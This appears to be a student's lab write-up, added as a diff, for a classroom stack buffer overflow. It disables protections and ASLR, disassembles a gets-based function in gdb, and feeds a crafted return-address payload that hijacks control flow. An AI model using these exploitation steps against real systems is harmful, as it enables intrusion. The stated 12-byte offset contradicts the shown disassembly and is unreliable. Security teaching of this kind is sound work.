@@ -1,0 +1,65 @@
+CS431 Programming 2
+
+Instructor: Guanhua Yan
+Due date: April 18. 
+Author: Mert Ozsaydi (mozsayd1@binghamton.edu)
+
+Step 1:
+
+gcc vuln_program.c -fno-stack-protector -z execstack -static -o vuln_program
+
+Step 2:
+
+sudo sysctl -w kernel.randomize_va_space=0
+
+Step 3:
+
+gcc vuln_attack.c -o vuln_attack
+
+Step 4:
+
+We need to find the adress of the target and size of buffer 
+
+(gdb) b target
+
+(gdb) disas prompt
+
+What lea does, essentially, is load the memory address being pointed to in the second argument, into the first argument.
+
+Dump of assembler code for function prompt:
+   0x08048e44 <+0>:     push   %ebp
+   0x08048e45 <+1>:     mov    %esp,%ebp
+   0x08048e47 <+3>:     sub    $0x88,%esp
+   0x08048e4d <+9>:     lea    -0x6c(%ebp),%eax
+   0x08048e50 <+12>:    mov    %eax,(%esp)
+   0x08048e53 <+15>:    call   0x804f6e0 <gets>
+   0x08048e58 <+20>:    lea    -0x6c(%ebp),%eax
+   0x08048e5b <+23>:    mov    %eax,0x4(%esp)
+   0x08048e5f <+27>:    movl   $0x80bed28,(%esp)
+   0x08048e66 <+34>:    call   0x804f180 <printf>
+   0x08048e6b <+39>:    leave
+   0x08048e6c <+40>:    ret
+
+End of assembler dump.
+
+   8 // size of buf (char buf[8])
++  4 // four additional bytes for overwriting stack frame pointer
+  ----
+    12
+
+Step 5:
+
+./vuln_attack $'\x85\x8e\x04\x08' > ./data.txt
+
+Step 6:
+
+./vuln_program<./data.txt
+
+Output
+
+You entered: foofoofoofoofoofoofoofoofoofoofoofoofoofoofoofoofoofoofoofoofoofoofoofoofoofoofoofoofoofoofoofoofoofoofoofoofood�
+Haha! You got pwned!
+
+References:
+
+https://www.owasp.org/index.php/Buffer_overflow_attack
